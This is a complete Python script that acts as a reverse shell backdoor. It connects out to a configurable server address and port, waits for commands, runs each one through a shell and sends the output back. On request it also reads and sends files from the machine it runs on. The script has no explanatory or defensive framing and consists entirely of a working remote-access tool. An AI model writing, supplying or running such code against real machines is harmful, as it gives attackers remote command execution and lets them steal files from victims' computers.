import socket
import subprocess
import os

SERVER_HOST = "127.0.0.1"  # Change this to the server's IP address
SERVER_PORT = 9999  # Change this to the server's port

def connect_to_server():
    try:
        global client_socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print("ERROR: Could not connect to the server:", e)
        return False
    return True

def receive_commands():
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if command.lower() == "quit":
                break
            elif command[:2].lower() == "cd":
                os.chdir(command[3:])
                client_socket.send("Directory changed to {}".format(os.getcwd()).encode())
            elif command.lower()[:8] == "download":
                send_file(command[9:])
            else:
                cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd_output.stdout.read() + cmd_output.stderr.read()
                output_str = output_bytes.decode("utf-8", errors="replace")
                client_socket.send(output_str.encode())
        except Exception as e:
            print("ERROR: Could not execute command:", e)
            client_socket.send("ERROR: {}".format(str(e)).encode())

def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        client_socket.send(file_data)
    except Exception as e:
        print("ERROR: Could not send file:", e)
        client_socket.send("ERROR: {}".format(str(e)).encode())

def main():
    if connect_to_server():
        receive_commands()
    client_socket.close()

if __name__ == "__main__":
    main()